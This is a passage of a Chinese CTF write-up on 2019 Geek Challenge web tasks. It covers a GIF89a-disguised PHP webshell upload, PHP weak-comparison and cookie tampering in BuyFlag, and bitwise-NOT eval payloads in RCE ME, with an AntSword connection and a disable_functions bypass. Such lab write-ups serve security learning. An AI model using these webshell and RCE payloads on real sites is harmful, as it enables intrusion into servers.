+<p>传上去然后修改了conten头，但还是被警告了得上传图片</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185556170-1731322557379-45.png" alt="image-20241111185556170"></p>
+<p>那就伪造一下jpg格式</p>
+<h3 id="GIF89a伪造jpg格式文件"><a href="#GIF89a伪造jpg格式文件" class="headerlink" title="GIF89a伪造jpg格式文件"></a>GIF89a伪造jpg格式文件</h3><p>前面加上GIF89a，这个可以伪造成jpg格式的文件。</p>
+<p>上传后显示上传成功，猜测是在&#x2F;upload路径下</p>
+<p>于是访问&#x2F;upload&#x2F;1.phtml，成功后用蚁剑进行连接，就可以找到flag</p>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>打开题目，在menu里面找到flag的有关网站</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111193758763-1731325079995-49.png" alt="image-20241111193758763"></p>
+<p>看到需要验证学生的身份，猜测是cookie有关的，那就先抓包看看</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111193841804-1731325122814-51.png" alt="image-20241111193841804"></p>
+<p>看到隐藏代码，意思是我们需要post传入两个参数，money的值根据页面来说我们需要100000000money才能买flag，password的话需要绕过验证且值为404，可以看到这里是弱比较，所以404a或者404abc都能通过验证，那就传参吧(记得修改请求包，改成post请求包)</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111194130278-1731325291368-53.png" alt="image-20241111194130278"></p>
+<p>可以看到我们是成功通过验证了，但显示需要学生的身份，这时候我们可以注意到cookie有一个参数user等于0，cookie通常被用作身份验证，猜测把user改成1就行了，因为0表示false，1表示true</p>
+<p><strong>这边显示密码正确，身份验证也对了，但是money错误，怀疑是长度问题。（you have not enough money,loser~）</strong></p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111194400685.png" alt="image-20241111194400685"></p>
+<p>试着把money改成数组形式或者用科学计数法就可以了</p>
+<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">         <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>rce代码执行</p>
+<p>审代码</p>
+<p>我们通过get传入一个参数code，这个参数必须满足以下条件</p>
+<ul>
+<li>code参数的字符串长度不能大于40</li>
+<li>绕过preg_match正则匹配的字符</li>
+</ul>
+<p>preg_match(“&#x2F;[A-Za-z0-9]+&#x2F;“,$code</p>
+<ul>
+<li>**<code>A-Za-z0-9]</code>**：表示字符集，匹配任意一个字母（大写或小写）或数字。</li>
+<li>**<code>+</code>**：表示前面的字符集可以出现一次或多次。</li>
+</ul>
+<p>这就是很经典的无字母无数字rce</p>
+<p>可参考的做法就是用异或，取反，自增（这里限制了长度，所以自增不可以）进行构造payload</p>
+<p>我这里直接用取反方法给payload了，方法的话直接参考这三种方法构造payload就行</p>
+<p>payload:</p>
+<p>取反脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">$c=&#x27;phpinfo()&#x27;;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">$e=~($d);</span><br><span class="line">// if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$e))&#123;</span><br><span class="line">//     echo 0;</span><br><span class="line">// &#125;else &#123;</span><br><span class="line">//     echo 1;</span><br><span class="line">// &#125;</span><br><span class="line">echo $d;</span><br><span class="line">?&gt;</span><br><span class="line">url/?code=(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">plaintext</span><br><span class="line">disable_functions:</span><br><span class="line"></span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>
+
+<p>这么多函数都被禁用了，我们想办法代入<code>antsword</code>处理</p>
+<p>先看一下php的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">PHP Version 7.0.33`在7.2之前，构造`assert(eval($_POST[a]));</span><br><span class="line">php</span><br><span class="line">&lt;?php </span><br><span class="line">$a=&#x27;assert&#x27;;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$c=&#x27;eval($_POST[a])&#x27;;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">echo $d;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传后进行访问，用蚁剑进行连接，但发现readflag无法读取，权限设置也读不了，这时候可以用蚁剑的插件</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20241111204701806-1731329222948-55.png" alt="image-20241111204701806"></p>
+<p>然后</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250121173054824.png" alt="image-20250121173054824"></p>
+<p>可以看到终端出来了，我们直接&#x2F;readflag就可以拿到flag了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E8%B5%9B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">0x02赛题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-number">2.1.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%A4%A7%E5%85%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">知识点:请求头大全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Referer%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E6%9D%A5%E6%BA%90%E7%BD%91%E9%A1%B5"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">1.Referer伪造请求来源网页</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-User-Agent%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E7%94%A8%E6%88%B7"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">2.User-Agent伪造请求用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-X-Forwarded-For%E5%86%85%E7%BD%91%E4%BC%AA%E8%A3%85"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">3.X-Forwarded-For内网伪装</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">2.2.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text">网站备份文件漏洞:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#construct-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">__construct()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wake-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">__wake()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.4.</span> <span class="toc-text">__destruct()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87wakeup%E6%96%B9%E6%B3%95%E5%85%B6%E4%B8%80"><span class="toc-number">2.2.5.</span> <span class="toc-text">绕过wakeup方法其一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.3.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">2.4.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">2.5.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">2.6.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-number">2.7.</span> <span class="toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">2.8.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">2.9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">2.10.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">2.11.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GIF89a%E4%BC%AA%E9%80%A0jpg%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6"><span class="toc-number">2.11.1.</span> <span class="toc-text">GIF89a伪造jpg格式文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-number">2.12.</span> <span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">2.13.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=极客大挑战2019wp--web(已做完)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=极客大挑战2019wp--web(已做完)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=极客大挑战2019wp--web(已做完)&body=Check out this article: https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=极客大挑战2019wp--web(已做完)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=极客大挑战2019wp--web(已做完)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
